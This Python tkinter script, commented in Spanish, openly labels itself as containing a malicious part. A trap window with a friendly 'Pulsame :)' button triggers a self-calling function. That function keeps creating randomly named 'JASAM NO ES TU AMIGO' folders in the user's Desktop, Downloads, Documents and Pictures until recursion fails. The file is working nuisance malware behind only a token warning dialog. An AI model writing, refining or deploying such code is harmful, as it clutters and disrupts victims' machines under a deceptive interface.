import tkinter as tk
import tkinter.messagebox
import os
import shutil
import random

#FUNCIONES GLOBALES

directorio_escritorio = os.path.join(os.path.expanduser("~"), "Desktop")
directorio_descargas = os.path.join(os.path.expanduser("~"), "Downloads")
directorio_documentos = os.path.join(os.path.expanduser("~"), "Documents")
directorio_imagenes = os.path.join(os.path.expanduser("~"), "Pictures")
#PARTE MALICIOSA

def NoCabron():
    #ESCRIORIO
    os.chdir(directorio_escritorio)
    nombre_carpeta = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789.+-_@()=%$&·#") for i in range(10))
    os.makedirs("JASAM NO ES TU AMIGO  "+ nombre_carpeta)
    #DOWNLOADS
    os.chdir(directorio_descargas)
    nombre_carpeta = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789.+-_@()=%$&·#") for i in range(10))
    os.makedirs("JASAM NO ES TU AMIGO  "+ nombre_carpeta)
    #DOCUMENTS
    os.chdir(directorio_documentos)
    nombre_carpeta = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789.+-_@()=%$&·#") for i in range(10))
    os.makedirs("JASAM NO ES TU AMIGO  "+ nombre_carpeta)
    #PICTURES
    os.chdir(directorio_imagenes)
    nombre_carpeta = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789.+-_@()=%$&·#") for i in range(10))
    os.makedirs("JASAM NO ES TU AMIGO  "+ nombre_carpeta)
    NoCabron()
    
def Confirmacion():
    tk.messagebox.showwarning(title="Advertencia", message="¡Cuidado! ¿Estas seguro de que quieres continuar?.")
    NoCabron()
    
#VENTANA TRAMPA
tk.messagebox.showwarning(title="ATENCIÓN", message="ATENCIÓN ESTO ES UN PROGRAMA QUE NO SE RECOMIENDA EJECUTAR EN UNA MAQUINA REAL SI DECIDES CONTINUAR LO HARAS BAJO TU PROPIA RESPONSABILIDAD")
ventana = tk.Tk()
ventana.title("JASAM TU AMIGO")
ventana.geometry("1280x720")
ventana.config(background="black")

#BOTONES
botonNoCabron = tk.Button(ventana, text="Pulsame :)", command=Confirmacion)
botonNoCabron.config(height=("10"), width=("150"))
botonNoCabron.pack(pady=50)


ventana.mainloop()

